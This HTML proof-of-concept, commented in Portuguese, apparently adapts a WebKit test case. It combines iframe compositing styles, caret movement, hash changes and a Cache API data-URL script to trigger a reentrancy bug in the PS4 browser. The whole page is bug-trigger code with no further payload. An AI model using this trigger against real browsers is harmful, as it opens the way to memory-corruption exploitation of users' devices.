<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style>
  /* 1. Estilo original + Forçamento de camada de composição assíncrona (simula AsyncFrameScrolling) */
  iframe {
    content: url();
    zoom: 0.01;
    width: 20px;
    height: 20px;
    border: none;
    overflow: scroll;
    -webkit-overflow-scrolling: touch;
    transform: translateZ(0);
    will-change: transform, scroll-position;
  }

  /* Área editável para simular o estado do Caret Browsing */
  .caret-target {
    position: absolute;
    width: 1px;
    height: 1px;
    opacity: 0.01;
  }
</style>
</head>
<body>

<div id="x" class="caret-target" contenteditable="true">x</div>
<div id="y" class="caret-target" contenteditable="true">y</div>

<iframe id="i0"></iframe>

<script>
  // Helper para mover o cursor/caret ativamente (simula Caret Browsing)
  function moveCaretTo(elemId) {
    const el = document.getElementById(elemId);
    if (el) {
      el.focus();
      const sel = window.getSelection();
      const range = document.createRange();
      range.selectNodeContents(el);
      range.collapse(false);
      sel.removeAllRanges();
      sel.addRange(range);
    }
  }

  onload = () => {
    // 1. Injeta o frameset na raiz (idêntico ao teste original)
    document.documentElement.append(document.createElement('frameset'));

    const i0 = document.getElementById('i0');

    // 2. Listener do foco no iframe com troca de hash e manipulação ativa de Caret
    i0.onfocus = () => {
      moveCaretTo('y');
      location.hash = 'y'; // Aciona o loop de reentrância do PS4
    };

    // 3. Ponto de partida
    moveCaretTo('x');
    location.hash = 'x';

    // 4. Injeção assíncrona via Cache API (idêntico ao teste original)
    let s0 = document.createElement('script');
    s0.src = `data:text/javascript,caches.has('a').then(() => i0.focus());`;
    document.head.append(s0);
  };
</script>

</body>
</html>
